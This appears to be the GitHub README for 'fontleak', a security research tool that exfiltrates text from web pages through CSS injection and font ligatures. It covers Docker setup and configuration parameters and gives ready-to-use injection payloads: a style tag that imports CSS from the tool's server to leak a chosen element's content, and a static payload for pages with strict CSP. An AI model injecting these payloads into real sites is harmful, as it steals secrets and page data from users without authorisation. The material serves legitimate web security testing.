[![License](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
[![GitHub release (latest by date)](https://img.shields.io/github/v/release/adrgs/fontleak)](https://github.com/adrgs/fontleak/releases)
[![GitHub stars](https://img.shields.io/github/stars/adrgs/fontleak)](https://github.com/adrgs/fontleak/stargazers)
[![GitHub forks](https://img.shields.io/github/forks/adrgs/fontleak)](https://github.com/adrgs/fontleak/network/members)
[![GitHub contributors](https://img.shields.io/github/contributors/adrgs/fontleak)](https://github.com/adrgs/fontleak/graphs/contributors)
[![Follow @adragos_](https://img.shields.io/twitter/follow/adragos_?style=social)](https://twitter.com/adragos_)

<p align="center">
  <img width="400" alt="fontleak logo" src="https://github.com/user-attachments/assets/69d9b715-e9fc-4bc6-8e0c-b4126f44434e" />
</p>

# fontleak

Fast exfiltration of text using CSS and Ligatures. For a detailed technical explanation, check out my [blog post](https://adragos.ro/fontleak).

## Getting Started

#### Using Docker

You can quickly get started with fontleak using Docker:

```bash
# Run the container
docker run -it --rm -p 4242:4242 -e BASE_URL=http://localhost:4242 adrgs/fontleak
```

Set the `BASE_URL` environment variable to the public URL where the site will be accessible.

> This will only setup a basic HTTP/1.1 server. Use a reverse proxy like Caddy for TLS and HTTP/2 or HTTP/3.


## Using fontleak

The fontleak URL accepts several parameters to customize its behavior:

#### Parameters
- `selector`: CSS selector that matches exactly one element in the target page. default: env `SELECTOR` / `script:first-of-type`
- `attr`: Attribute to exfiltrate. default: env `ATTR` / `textContent`
- `parent`: Parent element of the target element (default: `body`, options: `body` or `head`). default: env `PARENT` / `body`
- `alphabet`: Characters to include in the font (default: env `ALPHABET` / `contents of string.printable`).

### Example Usage

Basic usage:
```html
<style>@import url("http://localhost:4242/");</style>
```

Custom selector, parent, and alphabet:
```html
<style>@import url("http://localhost:4242/?selector=.secret&parent=head&alphabet=abcdef0123456789");</style>
```

> **⚠️ Warning:** The CSS selector must match exactly one element in the target page. If the selector matches multiple elements or no elements, fontleak will fail to exfiltrate the text.

## Static payload

By default, fontleak will use [sequential import chaining](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b) to efficiently exfiltrate text. But it's not always the case that the target page CSP allows this. 

In this case, you can use the `/static` endpoint to generate a static CSS payload that only requires lax CSP for `img-src` and `font-src`.

```bash
wget http://localhost:4242/static -O payload.css
```

Which takes these additional parameters:
- `length`: Length of the payload. default: env `LENGTH` / `100`
- `browser`: Browser compatibility (options: `all`, `chrome`, `firefox`, `safari`). default: env `BROWSER` / `all`

> **⚠️ Warning:** Size of payload.css is directly proportional to the `length` and `alphabet` size. Choosing a target browser can enable certain optimizations.

Instead of unique ids, fontleak will group requests by (IP, User-Agent, Referer) pairs.

## Disclaimer

fontleak is a research project intended for educational and security testing purposes only. The author is not responsible for any misuse of this software. Users are solely responsible for ensuring they have proper authorization before using this tool in any environment. Use at your own risk.